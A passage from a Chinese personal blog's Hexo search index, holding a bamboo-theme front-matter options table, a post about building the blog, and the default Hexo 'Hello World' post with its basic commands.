选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th align="left">配置选项</th><th align="left">默认值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">title</td><td align="left"><code>Markdown</code> 的文件标题</td><td align="left">文章标题，强烈建议填写此选项</td></tr><tr><td align="left">date</td><td align="left">文件创建时的日期时间</td><td align="left">发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td align="left">swiper</td><td align="left">false</td><td align="left">表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td align="left">swiperImg</td><td align="left">无</td><td align="left">表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td align="left">swiperDesc</td><td align="left">无</td><td align="left">表示该文章在首页轮播封面需要显示的文字描述（摘要），如果没有，则使用<code>excerpt</code>，如果<code>excerpt</code>也没有，则取文章内容</td></tr><tr><td align="left">img</td><td align="left">无</td><td align="left">文章特征图，该文章显示的图片，没有则默认使用文章的特色图片</td></tr><tr><td align="left">excerpt</td><td align="left">无</td><td align="left">文章描述（摘要），该文章在首页的描述文字，如果没有，则取<code>swiperDesc</code>,如果<code>swiperDesc</code>也没有，则取文章内容（优先取<code>&lt;!-- more --&gt;</code>上面的内容）</td></tr><tr><td align="left">top</td><td align="left">false</td><td align="left">将该值设为true，则将该篇文章显示在首页的置顶栏目中</td></tr><tr><td align="left">toc</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示右侧目录</td></tr><tr><td align="left">tocOpen</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章右侧目录默认收缩</td></tr><tr><td align="left">onlyTitle</td><td align="left">false</td><td align="left">文章详情页头部是否只显示标题，不显示日期等信息</td></tr><tr><td align="left">comments</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示评论</td></tr><tr><td align="left">share</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示分享按钮</td></tr><tr><td align="left">copyright</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示版权声明</td></tr><tr><td align="left">donate</td><td align="left">true</td><td align="left">将该值设为false，则该篇文章不显示打赏按钮</td></tr><tr><td align="left">bgImg</td><td align="left">-</td><td align="left">单独为这篇文章设置背景图片或者背景颜色，可以是数组，数组里面放图片链接，可以是字符串，字符串里面是颜色值，空值则背景颜色透明</td></tr><tr><td align="left">bgImgTransition</td><td align="left">fade</td><td align="left">该篇文章的bgImg设置为数组,该值表示背景图片切换的动画, 有三种值（fade, scale, translate-fade）</td></tr><tr><td align="left">bgImgDelay</td><td align="left">180000(三分钟)</td><td align="left">该篇文章的bgImg设置为数组,该值表示背景图片切换的延迟时间,</td></tr><tr><td align="left">categories</td><td align="left">无</td><td align="left">文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td align="left">prismjs</td><td align="left">无</td><td align="left">如果使用的是hexo自带的prismjs代码高亮，通过设置该值为该篇文章设置不同的代码高亮主题（default, coy, dark, funky, okaidia, solarizedlight, tomorrow, twilight）</td></tr><tr><td align="left">tags</td><td align="left">无</td><td align="left">文章标签，一篇文章可以多个标签</td></tr><tr><td align="left">mathjax</td><td align="left">false</td><td align="left">mathjax公式</td></tr><tr><td align="left">imgTop</td><td align="left">true</td><td align="left">设置为<code>false</code>则文章和自定义页面顶部不要图片</td></tr></tbody></table><p>果然做<code>搬运工</code>非常舒适，直接搬了<code>yuang大佬</code>的，方便自己以后查看！</p>]]></content>
      
      
      <categories>
          
          <category> bamboo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> bamboo </tag>
            
            <tag> front-matter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站历程</title>
      <link href="/2022/03/20/jian-zhan-li-cheng/"/>
      <url>/2022/03/20/jian-zhan-li-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>算是拖了很久很久的事情了，大一就想要自己建个小站了，但是一直没有没有花时间去学习，这次下决心周末把他初步建完。经过这几天的实践，感觉建站真的挺不容易的（可能就是我菜）。本次建站花了两三天吧，都差不多是利用晚上的时间，晚上会熬到两点才去睡觉，终于算是初步完成。这次选用的是hexo进行搭建的博客，使用了yuong大佬的<a href="https://yuang01.gitee.io/">bamboo</a>主题，还算可以，有着丰富的功能，大佬也写了详细的新手教程，尽管不太完善，有些需要自己探索完成。  </p><p>说是自己搭建，其实就是下了个模板对着调整，说实话这个调整参数耗费了我不少时间，大部分时间就是在调整主题上面了。。。。使用hexo写博客，需要用到markdown的语法，虽然已经接触过多次了，CSDN上面的文章好像就是markdown写的，哦还可以使用<code>Typora</code>来写啊，差点忘记了。  </p><p>建立这个博客的初衷就是想要记录自己的生活和学习轨迹（<del>可能是想要成为一个<code>文人</code>？</del>），从文字就可以看得出来，我的文笔并不是太好，所以得多多练习，才能有所进步，当然本来重点就是来记录学习的情况（web真的好难啊-_-🙃）。  </p><p>希望搭了这个博客之后，有时间就来写点东西吧，毕竟不能白搭了。主要还是要写web的wp呢（<del>不能偷懒了</del>），以前写的wp放在了<a href="https://blog.csdn.net/m0_51326092?type=blog">CSDN</a>上，懒得搬运了，就这样吧o(╥﹏╥)o😇，冲冲冲！</p><p>看来只能写到这了。有缘人祝好😁</p><p>————————————  </p><p>后面心血来潮，就来调整了一下我的壁纸，主要是<code>《我想吃掉你的胰脏》</code>和<code>《那年我们》</code>的图，是我为数不多所喜爱的动漫和电视剧，<del>换个皮都这么开心</del>，，使用了hexo一段时间后，确实还是挺方便的，<del>不过写博客还是好麻烦，要花时间</del>，还要继续刷题呢。</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
            <tag> 闲言碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/03/18/hello-world/"/>
      <url>/2022/03/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p>so fuck????</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> helloworld </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hello </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
